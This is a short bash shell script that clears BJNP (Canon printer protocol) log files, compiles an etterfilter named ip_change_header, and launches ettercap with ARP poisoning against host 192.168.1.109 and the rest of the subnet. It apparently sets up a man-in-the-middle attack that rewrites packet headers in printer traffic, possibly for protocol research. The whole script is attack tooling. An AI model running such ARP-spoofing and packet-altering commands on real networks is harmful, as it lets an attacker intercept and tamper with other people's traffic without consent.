#!/bin/bash
sudo rm /tmp/BJNP_Header.log
sudo rm /tmp/BJNP_Header_Change.log
sudo etterfilter ip_change_header.filter -o ip_change_header.ef

sudo ettercap -Tq -F ip_change_header.ef -M arp:remote /192.168.1.109/ //
